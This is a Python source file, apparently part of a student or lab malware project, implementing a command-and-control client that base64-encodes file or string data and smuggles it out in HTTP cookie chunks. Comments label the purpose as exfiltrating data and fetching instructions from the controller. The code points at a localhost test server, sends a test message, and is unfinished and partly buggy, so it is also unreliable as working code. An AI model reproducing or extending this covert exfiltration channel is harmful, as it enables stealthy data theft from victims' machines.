from queue import Queue
from sys import getsizeof
import base64

import io
import os

from uuid import uuid1
import requests


URL = "http://127.0.0.1:8080/api"

commands = Queue()


def gen_string_chunks(string: str, chunk_size: int = 256):
    for i in range(0, len(string), chunk_size):
        yield string[i:i + chunk_size]

def gen_file_chunks(stream, chunk_size: int = 256):
    yield read_chunk_of_file(stream, chunk_size)

def gen_chunks(data, chunk_size: int = 256):
    
    if isinstance(data, io.BufferedReader):
        chunk = read_chunk_of_file(data, chunk_size)
        while chunk:
            yield str(base64.b64encode(chunk), "utf-8")
            chunk = read_chunk_of_file(data, chunk_size)
        
    if isinstance(data, str):
        chunks = string_chunks(data, chunk_size)
        for chunk in chunks:
            yield str(base64.b64encode(str.encode(chunk)), "utf-8")

def gen_cookies(client_id, packet_id, data, type="") -> dict:
    # prepare data to be exfiltrated

    cookies = {         # Max cookie size 4093 bytes
        '0': str(client_id),
        '1': str(packet_id),  
        '2': str(type),  # Type [+ filename]
    }
    
    # getsizeof(cookies)
    for chunk in gen_chunks(data, 10):
        print(chunk)
        cookies['3'] = chunk
        yield cookies
    # 3: str(data)   # Frame

def communicate_to_cc(cookies: dict) -> dict:
    r = requests.get(URL, cookies=cookies)
    # extract instructions from CC
    # print(r.cookies)
    return cookies


def read_file(filename: str):
    return open(filename, "rb")

def read_chunk_of_file(stream, chunk_size):
    return stream.read(chunk_size)

def write_file(filename: str):
    return open(filename, "ab")

def write_chunk_to_file(stream, chunk_size):
    return stream.write(chunk_size)

def string_chunks(string: str, chunk_size: int = 256):
    res = []
    for i in range(0, len(string), chunk_size):
        res.append(string[i:i + chunk_size])
    return res    

def communication_client_main():
    # generate uuid1
    client_id = str(uuid1())
    stream = read_file("src\malware\communication\mp.txt")
    stream = "hallo erik und felix, das ist eine test nachricht die ganzschön lang ist 💔🦄🐳"
    # read queue
    for cookie in  gen_cookies(client_id, "1", stream, "file hi.txt"):
        print("input:", base64.b64decode(cookie['3']))
        resp = communicate_to_cc(cookie)
        print(resp)
        
    # create cookie
    # commands.put( resp )


if '__main__' == __name__:

    communication_client_main()